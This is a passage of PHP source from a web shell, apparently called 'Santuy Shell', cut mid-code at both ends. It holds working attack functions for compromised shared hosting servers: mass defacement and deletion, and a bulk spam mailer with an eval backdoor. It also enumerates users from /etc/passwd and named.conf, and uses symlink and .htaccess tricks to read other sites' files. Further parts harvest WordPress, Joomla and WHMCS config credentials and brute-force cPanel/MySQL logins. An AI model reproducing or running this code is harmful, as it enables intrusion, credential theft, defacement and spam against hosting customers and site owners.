      elseif($_POST['mass'] == 'sabunmematikan') { gass_all(); }
      elseif($_POST['mass'] == 'massdeface') {
        echo "<div style='margin: 5px auto; padding: 5px'>";
        sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
        echo "</div>";  }
      else {
        echo "
        <center><font style='text-decoration;'>
        Select Type:<br>
        </font>
        <select class=\"select\" name=\"mass\"  style=\"width: 450px;\" height=\"10\">
        <option value=\"onedir\">Mass Deface 1 Dir</option>
        <option value=\"massdeface\">Mass Deface ALL Dir</option>
        <option value=\"sabunkabeh\">Sabun Massal Di Tempat</option>
        <option value=\"sabunmematikan\">Sabun Massal Bunuh Diri</option>
        <option value=\"hapusmassal\">Mass Delete Files</option></center></select><br>
        <font style='text-decoration;'>Folder:</font><br>
        <input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
        <font style='text-decoration;'>Filename:</font><br>
        <input type='text' name='d_file' value='TatsumiCrew.php' style='width: 450px;' height='10'><br>
        <font style='text-decoration;'>Index File:</font><br>
        <textarea name='script' style='width: 450px; height: 200px;'>Hacked By ./p0tz</textarea><br>
        <input type='submit' name='start' value='Gass Cok!' style='width: 450px;'>
        </form></center>";
        }
      } elseif($_GET['do'] == 'Domains') 
      {
        echo "<center><div class='mybox'><p align='center' class='cgx2'>Domains and Users</p>";$d0mains = @file("/etc/named.conf");if(!$d0mains){die("<center>Error : can't read [ /etc/named.conf ]</center>");}echo '<table id="output"><tr bgcolor=#22222><td>Domains</td><td>users</td></tr>';foreach($d0mains as $d0main){if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);flush();if(strlen(trim($domains[1][0])) > 2){$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));echo "<tr><td><a href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td><td>".$user['name']."</td></tr>";flush();}}}echo'</div></center>';
        } elseif($_GET['do'] == 'logout') {
echo '<form action="?dir=$dir&do=logout" method="post">';
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]); 
    echo 'See You Next Time!!';

    } elseif ($_GET['do'] == 'mailer') {
            echo "</br><tr><td></font></td></tr>"; (@copy($_FILES['f']['tmp_name'], $_FILES['f']['name'])); $in = $_GET['in']; if(isset($in) && !empty($in)){ echo @eval(base64_decode('ZGllKGluY2x1ZGVfb25jZSAkaW4pOw==')); } $ev = $_POST['ev']; if(isset($ev) && !empty($ev)){ echo eval(urldecode($ev)); exit; } if(isset($_POST['action'] ) ){ $action=$_POST['action']; $message=$_POST['message']; $emaillist=$_POST['emaillist']; $from=$_POST['from']; $subject=$_POST['subject']; $realname=$_POST['realname']; $wait=$_POST['wait']; $tem=$_POST['tem']; $smv=$_POST['smv']; $message = urlencode($message); $message = preg_replace("/%5C%22/", "%22", $message); $message = urldecode($message); $message = stripslashes($message); $subject = stripslashes($subject); } ?>
    <form name="form" method="post" enctype="multipart/form-data" action="">
        <table width="100%" border="0">
            <tr>
                <td width="10%">
                <div align="right" class="auto-style7">
                    <font size="-3" face="Verdana, Arial, 
    Helvetica, sans-serif">Sender Email:</font></div>
                </td>
                <td style="width: 40%">
                <font size="-3" face="Verdana, Arial, Helvetica, 
    sans-serif"><input name="from" value="<?php echo($from); ?>" size="30" type="text" class="auto-style6" /><br>
                <td>
                <div align="right" class="auto-style7">
                    <font size="-3" face="Verdana, Arial, 
    Helvetica, sans-serif">Sender Name:</font></div>
                </td>
                <td width="41%">
                <font size="-3" face="Verdana, Arial, Helvetica, 
    sans-serif"><input name="realname" value="<?php echo($realname); ?>" size="30" type="text" class="auto-style6" />
                <br>        </tr>
            <tr>
                <td width="10%">

            </tr>
            <tr>
                <td width="10%">
                <div align="right" class="auto-style7">
                    <font size="-3" face="Verdana, Arial, 
    Helvetica, sans-serif">Subject:</font></div>
                </td>
                <td colspan="3">
                <font size="-3" face="Verdana, Arial, Helvetica, 
    sans-serif"><input name="subject" value="<?php echo($subject); ?>" size="30" type="text" class="auto-style6" /> </font></br>
                
            
            <tr valign="top">
                <td colspan="3" style="height: 260px">
                <font size="-3" face="Verdana, Arial, Helvetica, 
    sans-serif"><textarea name="message" rows="10" style="width: 455px" class="auto-style6"><?php echo($message); ?></textarea>&nbsp;<br class="auto-style3" />
                <input name="action" value="send" type="hidden" class="auto-style3" />
                <input type="button" id="prvbtn" value="Preview" onclick="prv()" style="width: 81px" class="auto-style6" /><input value="Send" type="submit" class="auto-style6" /><span class="auto-style3">&nbsp;
                </span><span class="auto-style7">Wait</span><span class="auto-style3">
                </span> 
                <input name="wait" type="text" value="<?php echo($wait); ?>" size="8" class="auto-style6" /><span class="auto-style3">&nbsp;</span><span class="auto-style7"> 
                seconds to send </span> </font></td>
                <td width="41%" class="style2" style="height: 150px">
                <font size="-3" face="Verdana, Arial, Helvetica, 
    sans-serif">
                <textarea id="emails" name="emaillist" cols="30" onselect="funchange()" onchange="funchange()" onkeydown="funchange()" onkeyup="funchange()" onchange="funchange()" style="height: 161px" class="auto-style6"><?php echo($emaillist); ?></textarea> <img src="http://s3curity.tn/wp-content/uploads-images/ppcom.png" height="1" width="0">
                <br class="auto-style5" />
                <span class="auto-style7">Quantity Emails : </span> </font><span  id="enum" class="style1">0<br class="auto-style3" />
                </span>
                <span  class="auto-style8">Divide the mailing list by:</span> 
                <input name="textml" id="txtml" type="text" value="," size="8" class="auto-style6" /><span class="auto-style3">&nbsp;&nbsp;&nbsp;
                </span>
                <input type="button" onclick="mlsplit()" value="Divide" style="height: 23px" class="auto-style6" /></td>
            </tr>
        </table>
                <font size="-3" face="Verdana, Arial, Helvetica, 
    sans-serif">
    <div id="preview">
    </div>
        </font>
    </form>
    <?php 
    if ($action){ if (!$from || !$subject || !$message || !$emaillist){ print "Please complete all fields before sending your message."; exit; } $nse=array(); $allemails = explode("
    ", $emaillist); $numemails = count($allemails); if(!empty($_POST['wait']) && $_POST['wait'] > 0){ set_time_limit(intval($_POST['wait'])*$numemails*3600); }else{ set_time_limit($numemails*3600); } if(!empty($smv)){ $smvn+=$smv; $tmn=$numemails/$smv+1; }else{ $tmn=1; } for($x=0; $x<$numemails; $x++){ $to = $allemails[$x]; if ($to){ $to = preg_replace("/ /", "", $to); $message = preg_replace("/EM/", $to, $message); $subject = preg_replace("/EM/", $to, $subject); flush(); $header = "From: $realname <$from>
    "; $header .= "MIME-Version: 1.0
    "; $header .= "Content-Type: text/html
    "; if ($x==0 && !empty($tem)) { if(!@mail($tem,$subject,$message,$header)){ print('The test Post was not Submitted.<br />'); $tmns+=1; }else{ print('Your Message was Sent Test.<br />'); $tms+=1; } } if($x==$smvn && !empty($_POST['smv'])){ if(!@mail($tem,$subject,$message,$header)){ print('The test Post was not Submitted.<br />'); $tmns+=1; }else{ print('Your Message was Sent Test.<br />'); $tms+=1; } $smvn+=$smv; } print "$to ....... "; $msent = @mail($to, $subject, $message, $header); $xx = $x+1; $txtspamed = "spammed"; if(!$msent){ $txtspamed = "error"; $ns+=1; $nse[$ns]=$to; } print "$xx / $numemails .......  $txtspamed<br>"; flush(); if(!empty($wait)&& $x<$numemails-1){ sleep($wait); } } } }
    } elseif ($_GET['do'] == 'jumping') {
        $i = 0;
        echo "<pre><div class='margin: 5px auto;'>";
        $etc = fopen("/etc/passwd", "r") or die("<font color=maroon>Can't read /etc/passwd</font>");
        while ($passwd = fgets($etc)) {
            if ($passwd == '' || !$etc) {
                echo "<font color=maroon>Can't read /etc/passwd</font>";
            } else {
                preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
                foreach ($user_jumping[1] as $user_noname_jump) {
                    $user_jumping_dir = "/home/$user_noname_jump/public_html";
                    if (is_readable($user_jumping_dir)) {
                        $i++;
                        $jrw = "[<font color=green>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
                        if (is_writable($user_jumping_dir)) {
                            $jrw = "[<font color=green>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
                        }
                        echo $jrw;
                        if (function_exists('posix_getpwuid')) {
                            $domain_jump = file_get_contents("/etc/named.conf");
                            if ($domain_jump == '') {
                                echo " => ( <font color=maroon>gabisa ambil nama domain nya</font> )<br>";
                            } else {
                                preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                                foreach ($domains_jump[1] as $dj) {
                                    $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                    $user_jumping_url = $user_jumping_url['name'];
                                    if ($user_jumping_url == $user_noname_jump) {
                                        echo " => ( <u>$dj</u> )<br>";
                                        break;
                                    }
                                }
                            }
                        } else {
                            echo "<br>";
                        }
                    }
                }
            }
        }

        if ($i == 0) {
        } else {
            echo "<br>Cuma ada " . $i . " Kamar di " . gethostbyname($_SERVER['HTTP_HOST']) . "";
        }
        echo "</div></pre>";
      }
      elseif($_GET['do'] == 'symlink') {
    $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
    $d0mains = @file("/etc/named.conf");
    ##httaces
    if($d0mains){
    @mkdir("santuy_sym",0777);
    @chdir("santuy_sym");
    @exe("ln -s / root");
    $file3 = 'Options Indexes FollowSymLinks
    DirectoryIndex kal.htm
    AddType text/plain .php
    AddHandler text/plain .php
    Satisfy Any';
    $fp3 = fopen('.htaccess','w');
    $fw3 = fwrite($fp3,$file3);@fclose($fp3);
    echo "<br>
    <table align=center border=1 style='width:60%;border-color:#333333;'>
    <tr>
    <td align=center><font size=2>S. No.</font></td>
    <td align=center><font size=2>Domains</font></td>
    <td align=center><font size=2>Users</font></td>
    <td align=center><font size=2>Symlink</font></td>
    </tr>";
    $dcount = 1;
    foreach($d0mains as $d0main){
    if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
    flush();
    if(strlen(trim($domains[1][0])) > 2){
    $user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
    echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
    <td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
    <td>".$user['name']."</td>
    <td><a href='$full/santuy_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
    flush();
    $dcount++;}}}
    echo "</table>";
    }else{
    $TEST=@file('/etc/passwd');
    if ($TEST){
    @mkdir("santuy_sym",0777);
    @chdir("santuy_sym");
    exe("ln -s / root");
    $file3 = 'Options Indexes FollowSymLinks
    DirectoryIndex kal.htm
    AddType text/plain .php
    AddHandler text/plain .php
    Satisfy Any';
     $fp3 = fopen('.htaccess','w');
     $fw3 = fwrite($fp3,$file3);
     @fclose($fp3);
     echo "
     <table align=center border=1><tr>
     <td align=center><font size=3>S. No.</font></td>
     <td align=center><font size=3>Users</font></td>
     <td align=center><font size=3>Symlink</font></td></tr>";
     $dcount = 1;
     $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
     while(!feof($file)){
     $s = fgets($file);
     $matches = array();
     $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
     $matches = str_replace("home/","",$matches[1]);
     if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
     continue;
     echo "<tr><td align=center><font size=2>" . $dcount . "</td>
     <td align=center><font class=txt>" . $matches . "</td>";
     echo "<td align=center><font class=txt><a href=$full/santuy_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
     $dcount++;}fclose($file);
     echo "</table>";}else{if($os != "Windows"){@mkdir("santuy_sym",0777);@chdir("santuy_sym");@exe("ln -s / root");$file3 = '
     Options Indexes FollowSymLinks
    DirectoryIndex kal.htm
    AddType text/plain .php
    AddHandler text/plain .php
    Satisfy Any
    ';
     $fp3 = fopen('.htaccess','w');
     $fw3 = fwrite($fp3,$file3);@fclose($fp3);
     echo "
     <div class='mybox'><h2 class='k2ll33d2'>server symlinker</h2>
     <table align=center border=1><tr>
     <td align=center><font size=3>ID</font></td>
     <td align=center><font size=3>Users</font></td>
     <td align=center><font size=3>Symlink</font></td></tr>";
     $temp = "";$val1 = 0;$val2 = 1000;
     for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
     if ($uid)$temp .= join(':',$uid)."\n";}
     echo '<br/>';$temp = trim($temp);$file5 =
     fopen("test.txt","w");
     fputs($file5,$temp);
     fclose($file5);$dcount = 1;$file =
     fopen("test.txt", "r") or exit("Unable to open file!");
     while(!feof($file)){$s = fgets($file);$matches = array();
     $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
     if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
     continue;
     echo "<tr><td align=center><font size=2>" . $dcount . "</td>
     <td align=center><font class=txt>" . $matches . "</td>";
     echo "<td align=center><font class=txt><a href=$full/santuy_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
     $dcount++;}
     fclose($file);
     echo "</table></div></center>";unlink("test.txt");
     } else
     echo "<center><font size=3>Cannot create Symlink</font></center>";
     }
     }
     } elseif($_GET['do'] == 'kill') {
    if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
            die('<center><br><center><h2>Shell removed</h2><br>Goodbye , Thanks for take my shell today</center></center>');
        else
            echo '<center>unlink failed!</center>';
     } elseif($_GET['do'] == 'cpanel') {
      if($_POST['crack']) {
        $usercp = explode("\r\n", $_POST['user_cp']);
        $passcp = explode("\r\n", $_POST['pass_cp']);
        $i = 0;
        foreach($usercp as $ucp) {
          foreach($passcp as $pcp) {
            if(@mysql_connect('localhost', $ucp, $pcp)) {
              if($_SESSION[$ucp] && $_SESSION[$pcp]) {
              } else {
                $_SESSION[$ucp] = "1";
                $_SESSION[$pcp] = "1";
                if($ucp == '' || $pcp == '') {
                  
                } else {
                  $i++;
                  if(function_exists('posix_getpwuid')) {
                    $domain_cp = file_get_contents("/etc/named.conf");  
                    if($domain_cp == '') {
                      $dom =  "<font color=maroon>gabisa ambil nama domain nya</font>";
                    } else {
                      preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
                      foreach($domains_cp[1] as $dj) {
                        $user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                        $user_cp_url = $user_cp_url['name'];
                        if($user_cp_url == $ucp) {
                          $dom = "<a href='http://$dj/' target='_blank'><font color=green>$dj</font></a>";
                          break;
                        }
                      }
                    }
                  } else {
                    $dom = "<font color=maroon>function is Disable by system</font>";
                  }
                  echo "username (<font color=green>$ucp</font>) password (<font color=green>$pcp</font>) domain ($dom)<br>";
                }
              }
            }
          }
        }
        if($i == 0) {
        } else {
          echo "<br>sukses nyolong ".$i." Cpanel by <font color=darkgreen>Santuy Shell.</font>";
        }
      } else {
        echo "<center>
        <form method='post'>
        USER: <br>
        <textarea style='width: 450px; height: 150px;' name='user_cp'>";
        $_usercp = fopen("/etc/passwd","r");
        while($getu = fgets($_usercp)) {
          if($getu == '' || !$_usercp) {
            echo "<font color=maroon>Can't read /etc/passwd</font>";
          } else {
            preg_match_all("/(.*?):x:/", $getu, $u);
            foreach($u[1] as $user_cp) {
                if(is_dir("/home/$user_cp/public_html")) {
                  echo "$user_cp\n";
              }
            }
          }
        }
        echo "</textarea><br>
        PASS: <br>
        <textarea style='width: 450px; height: 200px;' name='pass_cp'>";
        function cp_pass($dir) {
          $pass = "";
          $dira = scandir($dir);
          foreach($dira as $dirb) {
            if(!is_file("$dir/$dirb")) continue;
            $ambil = file_get_contents("$dir/$dirb");
            if(preg_match("/WordPress/", $ambil)) {
              $pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
            } elseif(preg_match("/JConfig|joomla/", $ambil)) {
              $pass .= ambilkata($ambil,"password = '","'")."\n";
            } elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
              $pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
            } elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
              $pass .= ambilkata($ambil,'password = "','"')."\n";
            } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
              $pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
            } elseif(preg_match("/client/", $ambil)) {
              preg_match("/password=(.*)/", $ambil, $pass1);
              $pass .= $pass1[1]."\n";
              if(preg_match('/"/', $pass1[1])) {
                $pass1[1] = str_replace('"', "", $pass1[1]);
                $pass .= $pass1[1]."\n";
              }
            } elseif(preg_match("/cc_encryption_hash/", $ambil)) {
              $pass .= ambilkata($ambil,"db_password = '","'")."\n";
            }
          }
          echo $pass;
        }
        $cp_pass = cp_pass($dir);
        echo $cp_pass;
        echo "</textarea><br>
        <input type='submit' name='crack' style='width: 450px;' value='Crack'>
        </form>
        <span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder config ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
      }
    } elseif($_GET['do'] == 'vhost'){
      echo "<form method='POST' action=''>";
      echo "<center><br><font size='6'>Bypass Symlink vHost</font><br><br>";
      echo "<center><input type='submit' value='Bypass it' name='Colii'></center>";
        if (isset($_POST['Colii'])){ system('ln -s / santuy.txt');
          $fvckem ='T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw';
          $file = fopen(".htaccess","w+"); $write = fwrite ($file ,base64_decode($fvckem)); $Bok3p = symlink("/","Rintoar.txt");
          $rt="<br><a href=santuy.txt TARGET='_blank'><font color=#ff0000 size=2 face='Courier New'><b>
      Bypassed Successfully</b></font></a>";
      echo "<br><br><b>Done.. !</b><br><br>Cek link yang diberikan di bawah ini untuk folder symlink<br>$rt</center>";} echo "</form>";
     } elseif($_GET['do'] == 'config') {
      $etc = fopen("/etc/passwd", "r") or die("<pre><font color=maroon>Can't read /etc/passwd</font></pre>");
      $idx = mkdir("santuy_config", 0777);
      $isi_htc = "Options all\nRequire None\nSatisfy Any";
      $htc = fopen("santuy_config/.htaccess","w");
      fwrite($htc, $isi_htc);
      while($passwd = fgets($etc)) {
        if($passwd == "" || !$etc) {
          echo "<font color=maroon>Can't read /etc/passwd</font>";
        } else {
          preg_match_all('/(.*?):x:/', $passwd, $user_config);
          foreach($user_config[1] as $user_noname) {
            $user_config_dir = "/home/$user_noname/public_html/";
            if(is_readable($user_config_dir)) {
              $grab_config = array(
                "/home/$user_noname/.my.cnf" => "cpanel",
                "/home/$user_nonme/.accesshash" => "WHM-accesshash",
                "/home/$user_noname/public_html/vdo_config.php" => "Voodoo",
                "/home/$user_noname/public_html/bw-configs/config.ini" => "BosWeb",
                "/home/$user_noname/public_html/config/koneksi.php" => "Lokomedia",
                "/home/$user_noname/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
                "/home/$user_noname/public_html/clientarea/configuration.php" => "WHMCS",
                "/home/$user_noname/public_html/whm/configuration.php" => "WHMCS",
                "/home/$user_noname/public_html/whmcs/configuration.php" => "WHMCS",
                "/home/$user_noname/public_html/forum/config.php" => "phpBB",
                "/home/$user_noname/public_html/sites/default/settings.php" => "Drupal",
                "/home/$user_noname/public_html/config/settings.inc.php" => "PrestaShop",
                "/home/$user_noname/public_html/app/etc/local.xml" => "Magento",
                "/home/$user_noname/public_html/joomla/configuration.php" => "Joomla",
                "/home/$user_noname/public_html/configuration.php" => "Joomla",
                "/home/$user_noname/public_html/wp/wp-config.php" => "WordPress",
                "/home/$user_noname/public_html/wordpress/wp-config.php" => "WordPress",
                "/home/$user_noname/public_html/wp-config.php" => "WordPress",
                "/home/$user_noname/public_html/admin/config.php" => "OpenCart",
                "/home/$user_noname/public_html/slconfig.php" => "Sitelok",
                "/home/$user_noname/public_html/application/config/database.php" => "Ellislab");
              foreach($grab_config as $config => $nama_config) {
                $ambil_config = file_get_contents($config);
                if($ambil_config == '') {
                } else {
                  $file_config = fopen("santuy_config/$user_noname-$nama_config.txt","w");
                  fputs($file_config,$ambil_config);
                }
              }
            }   
          }
        } 
      }
      echo "<center><a href='?dir=$dir/santuy_config'><font color=lime>Done</font></a></center>";
    }
    elseif($_GET['do'] == 'symconfig') {
    if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
    echo '<script>alert("Skid this won\'t work on Windows")</script>';
    exit;
    }
    else
    {
    if($_POST["m"] && !$_POST["passwd"]==""){
    @mkdir("santuy_symconf", 0777);
    @chdir("santuy_symconf");
    @symlink("/","root");
    $htaccess="Options Indexes FollowSymLinks
    DirectoryIndex nonameisjustice.htm
    AddType text/plain .php 
    AddHandler text/plain .php
    Satisfy Any";
    @file_put_contents(".htaccess",$htaccess);
    $etc_passwd=$_POST["passwd"];
    $etc_passwd=explode("\n",$etc_passwd);
    foreach($etc_passwd as $passwd){
    $pawd=explode(":",$passwd);
    $user =$pawd[0];

    @symlink('/','santuy_symconf/root');
    @symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
    @symlink('/home/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
    @symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
